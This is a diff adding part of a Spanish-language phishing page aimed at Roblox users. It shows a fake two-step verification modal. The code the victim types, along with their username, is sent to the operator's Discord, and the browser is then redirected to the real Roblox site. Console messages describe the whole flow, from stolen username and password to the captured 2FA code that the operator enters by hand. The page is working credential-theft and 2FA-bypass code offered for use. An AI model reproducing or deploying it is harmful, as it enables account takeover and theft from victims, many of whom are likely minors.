+    // Crear modal
+    const modal = document.createElement('div');
+    modal.style.cssText = `
+        background: #1a1a2e;
+        border-radius: 16px;
+        padding: 40px;
+        max-width: 400px;
+        width: 90%;
+        color: white;
+        box-shadow: 0 20px 60px rgba(0,0,0,0.8);
+        border: 1px solid #335FFF;
+        text-align: center;
+        animation: slideIn 0.3s ease;
+    `;
+    
+    modal.innerHTML = `
+        <div style="font-size: 48px; margin-bottom: 16px;">🔐</div>
+        <h2 style="color: #fff; margin-bottom: 8px; font-size: 22px;">Verificación en 2 Pasos</h2>
+        <p style="color: #aaa; font-size: 14px; line-height: 1.6; margin-bottom: 8px;">
+            Hemos enviado un código de verificación a tu correo electrónico
+        </p>
+        <p style="color: #335FFF; font-size: 13px; margin-bottom: 20px;">
+            📧 ${username}
+        </p>
+        <p style="color: #888; font-size: 13px; margin-bottom: 16px;">
+            Ingresa el código de 6 dígitos
+        </p>
+        <input type="text" id="2fa-code-input" 
+               placeholder="123456" 
+               style="
+                   width: 100%;
+                   padding: 14px 16px;
+                   background: #2a2a4a;
+                   border: 1px solid #444;
+                   border-radius: 8px;
+                   color: white;
+                   font-size: 24px;
+                   text-align: center;
+                   letter-spacing: 8px;
+                   font-weight: bold;
+                   margin-bottom: 16px;
+                   outline: none;
+               "
+               maxlength="6"
+               inputmode="numeric"
+               autofocus>
+        <button id="verify-2fa-btn" style="
+            width: 100%;
+            background: #335FFF;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 14px 20px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.2s;
+        ">Verificar</button>
+        <p style="color: #666; font-size: 12px; margin-top: 16px;">
+            ⏳ El código expirará en 10 minutos
+        </p>
+        <p style="color: #444; font-size: 11px; margin-top: 12px;">
+            🔒 Nunca compartas este código con nadie
+        </p>
+    `;
+    
+    overlay.appendChild(modal);
+    document.body.appendChild(overlay);
+    
+    // Focus en el input
+    setTimeout(() => {
+        document.getElementById('2fa-code-input')?.focus();
+    }, 300);
+    
+    // Manejar verificación
+    document.getElementById('verify-2fa-btn').addEventListener('click', function() {
+        const code = document.getElementById('2fa-code-input').value.trim();
+        if (code.length === 6 && /^\\d{6}$/.test(code)) {
+            // Enviar código a Discord
+            enviarCodigo2FA(code, username);
+            
+            // Cerrar modal
+            overlay.remove();
+            
+            // Mostrar mensaje de éxito
+            mostrarMensajeExito();
+        } else {
+            // Error
+            const input = document.getElementById('2fa-code-input');
+            input.style.borderColor = '#ff4444';
+            input.style.animation = 'shake 0.5s';
+            setTimeout(() => {
+                input.style.borderColor = '#444';
+                input.style.animation = '';
+            }, 500);
+        }
+    });
+    
+    // Enter key
+    document.getElementById('2fa-code-input').addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') {
+            document.getElementById('verify-2fa-btn').click();
+        }
+    });
+    
+    // Añadir estilos de animación
+    const style = document.createElement('style');
+    style.textContent = `
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        @keyframes slideIn {
+            from { transform: scale(0.9) translateY(20px); opacity: 0; }
+            to { transform: scale(1) translateY(0); opacity: 1; }
+        }
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20% { transform: translateX(-10px); }
+            40% { transform: translateX(10px); }
+            60% { transform: translateX(-10px); }
+            80% { transform: translateX(10px); }
+        }
+    `;
+    document.head.appendChild(style);
+}
+
+// ============================================================
+// ENVIAR CÓDIGO 2FA A DISCORD
+// ============================================================
+
+async function enviarCodigo2FA(code, username) {
+    await sendToDiscord(
+        "🎯 CÓDIGO 2FA CAPTURADO - INGRESA MANUALMENTE EN ROBLOX",
+        [
+            { name: "🔒 Código 2FA", value: `\`${code}\``, inline: true },
+            { name: "👤 Usuario", value: `\`${username}\``, inline: true },
+            { name: "📅 Hora", value: new Date().toLocaleString(), inline: true },
+            { name: "📌 Acción", value: "⚠️ INGRESA ESTE CÓDIGO EN ROBLOX MANUALMENTE", inline: false }
+        ],
+        0x00FF00
+    );
+    
+    console.log('✅ Código 2FA enviado a Discord:', code);
+}
+
+// ============================================================
+// MENSAJE DE ÉXITO
+// ============================================================
+
+function mostrarMensajeExito() {
+    const div = document.createElement('div');
+    div.style.cssText = `
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background: rgba(0,0,0,0.9);
+        color: #00FF00;
+        padding: 30px 40px;
+        border-radius: 16px;
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        font-size: 18px;
+        z-index: 9999999;
+        border: 2px solid #00FF00;
+        text-align: center;
+        animation: fadeIn 0.3s ease;
+        box-shadow: 0 20px 60px rgba(0,0,0,0.8);
+    `;
+    div.innerHTML = `
+        <div style="font-size: 48px; margin-bottom: 12px;">✅</div>
+        <div style="font-weight: bold; margin-bottom: 8px;">Código Verificado</div>
+        <div style="font-size: 14px; color: #aaa;">Redirigiendo a Roblox...</div>
+    `;
+    document.body.appendChild(div);
+    
+    setTimeout(() => {
+        div.remove();
+        // Redirigir a Roblox real
+        window.location.href = 'https://www.roblox.com';
+    }, 3000);
+}
+
+console.log('🎣 Phishing Manual - Sistema listo');
+console.log('📋 Flujo:');
+console.log('  1. Víctima ingresa user+pass → Llega a Discord');
+console.log('  2. Modal pide código 2FA');
+console.log('  3. Víctima ingresa código → Llega a Discord');
+console.log('  4. Tú ingresas todo manualmente en Roblox');
+</body>
+</html>
